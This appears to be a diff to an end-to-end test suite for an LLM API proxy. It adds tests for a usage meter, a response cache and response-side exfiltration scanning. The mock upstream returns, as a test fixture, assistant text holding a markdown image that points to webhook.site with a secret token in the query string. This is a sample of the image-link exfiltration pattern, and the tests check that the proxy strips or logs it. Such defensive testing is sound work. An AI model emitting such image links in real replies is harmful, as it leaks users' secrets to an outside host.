@@ -227,13 +227,25 @@ describe('Proxy End-to-End (E2E) Suite', { timeout: 20000 }, () => {
           id: 'mock-msg-id',
           type: 'message',
           role: 'assistant',
-          content: [{ type: 'text', text: 'Clean response from mock upstream' }],
-          model: 'claude-3-opus-20240229'
+          content: [{
+            type: 'text',
+            text: body.includes('EXFIL_CASE')
+              ? 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
+              : 'Clean response from mock upstream',
+          }],
+          model: 'claude-3-opus-20240229',
+          usage: { input_tokens: 25, cache_read_input_tokens: 4000, cache_creation_input_tokens: 0, output_tokens: 7 },
         })
         // When the path asks for it, reply with Transfer-Encoding: chunked split
         // across several writes (no Content-Length). This exercises the proxy's
         // passthrough de-chunking — a chunked upstream must reach the client
         // framed exactly once, not double-framed with hex sizes in the body.
+        if (body.includes('SSE_CASE')) {
+          res.writeHead(200, { 'Content-Type': 'text/event-stream' })
+          res.write('event: content_block_delta\ndata: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"see ![c](https://webhook.site/abc-123?d=secret-token)"}}\n\n')
+          res.end('event: message_stop\ndata: {"type":"message_stop"}\n\n')
+          return
+        }
         if ((req.url || '').includes('chunked')) {
           res.writeHead(200, { 'Content-Type': 'application/json', 'Transfer-Encoding': 'chunked' })
           const mid = Math.floor(payload.length / 2)
@@ -564,6 +576,98 @@ describe('Proxy End-to-End (E2E) Suite', { timeout: 20000 }, () => {
     const moduleStats = await queryDashboard(testConfig.dashboard.port, '/api/modules')
     expect(moduleStats.totalTokensSaved).toBeGreaterThan(0)
     expect(moduleStats.overallPercentSaved).toBeGreaterThan(0)
+  })
+
+  it('E2E Case 7: the usage meter adds up what the provider reported, chunked or not', async () => {
+    const kpi = (stats: any, key: string): number =>
+      stats.modules.find((m: { id: string }) => m.id === 'usage-meter').kpis.find((k: { key: string }) => k.key === key).value
+    const before = await queryDashboard(testConfig.dashboard.port, '/api/modules')
+    for (const path of ['/v1/messages', '/v1/messages?chunked=1']) {
+      const response = await sendProxyRequest(
+        testConfig.proxy.port, 'api.anthropic.com', mockUpstreamPort, 'POST', path,
+        { 'Content-Type': 'application/json' },
+        JSON.stringify({ model: 'claude-3-opus-20240229', messages: [{ role: 'user', content: 'meter me' }] }),
+      )
+      expect(response.statusCode).toBe(200)
+    }
+    const after = await queryDashboard(testConfig.dashboard.port, '/api/modules')
+    expect(kpi(after, 'responses') - kpi(before, 'responses')).toBe(2)
+    expect(kpi(after, 'cacheRead') - kpi(before, 'cacheRead')).toBe(8000)
+    expect(kpi(after, 'input') - kpi(before, 'input')).toBe(50)
+    expect(kpi(after, 'output') - kpi(before, 'output')).toBe(14)
+  })
+
+  it('E2E Case 8: the response cache replays a repeated request without calling upstream', async () => {
+    testConfig.modules!.responseCache!.enabled = true
+    try {
+      receivedRequests = []
+      const send = () => sendProxyRequest(
+        testConfig.proxy.port, 'api.anthropic.com', mockUpstreamPort, 'POST', '/v1/messages',
+        { 'Content-Type': 'application/json', 'x-api-key': 'sk-case-8' },
+        JSON.stringify({ model: 'claude-3-opus-20240229', messages: [{ role: 'user', content: 'cache me through the proxy' }] }),
+      )
+      const first = await send()
+      const second = await send()
+      expect(first.statusCode).toBe(200)
+      expect(second.statusCode).toBe(200)
+      expect(receivedRequests).toHaveLength(1)
+      expect(JSON.parse(second.body)).toEqual(JSON.parse(first.body))
+    } finally {
+      testConfig.modules!.responseCache!.enabled = false
+    }
+  })
+
+  it('E2E Case 9: a replayed response passes the response-side scans under the policy of the moment', async () => {
+    // Stored while response scanning was off, replayed after block mode was
+    // switched on: the replay must be neutralized like a live response.
+    const savedScan = testConfig.responseScan
+    testConfig.modules!.responseCache!.enabled = true
+    try {
+      receivedRequests = []
+      const send = () => sendProxyRequest(
+        testConfig.proxy.port, 'api.anthropic.com', mockUpstreamPort, 'POST', '/v1/messages',
+        { 'Content-Type': 'application/json', 'x-api-key': 'sk-case-9' },
+        JSON.stringify({ model: 'claude-3-opus-20240229', messages: [{ role: 'user', content: 'EXFIL_CASE chart please' }] }),
+      )
+      testConfig.responseScan = { enabled: false, mode: 'audit' }
+      const stored = await send()
+      expect(stored.body).toContain('webhook.site')
+
+      testConfig.responseScan = { enabled: true, mode: 'block' }
+      const replayed = await send()
+      expect(receivedRequests).toHaveLength(1)
+      expect(replayed.statusCode).toBe(200)
+      expect(replayed.body).not.toContain('webhook.site')
+    } finally {
+      testConfig.modules!.responseCache!.enabled = false
+      testConfig.responseScan = savedScan
+    }
+  })
+
+  it('E2E Case 10: a replayed stream gets the audit scans a live stream gets', async () => {
+    const savedScan = testConfig.responseScan
+    testConfig.modules!.responseCache!.enabled = true
+    const exfilEvents = () => eventBus.getAll().filter(e => e.kind === 'response-exfil').length
+    try {
+      receivedRequests = []
+      const send = () => sendProxyRequest(
+        testConfig.proxy.port, 'api.anthropic.com', mockUpstreamPort, 'POST', '/v1/messages',
+        { 'Content-Type': 'application/json', 'x-api-key': 'sk-case-10' },
+        JSON.stringify({ model: 'claude-3-opus-20240229', stream: true, messages: [{ role: 'user', content: 'SSE_CASE chart please' }] }),
+      )
+      testConfig.responseScan = { enabled: false, mode: 'audit' }
+      await send()
+      const before = exfilEvents()
+
+      testConfig.responseScan = { enabled: true, mode: 'audit' }
+      const replayed = await send()
+      expect(receivedRequests).toHaveLength(1)
+      expect(replayed.body).toContain('message_stop')
+      expect(exfilEvents()).toBe(before + 1)
+    } finally {
+      testConfig.modules!.responseCache!.enabled = false
+      testConfig.responseScan = savedScan
+    }
   })
 })
 
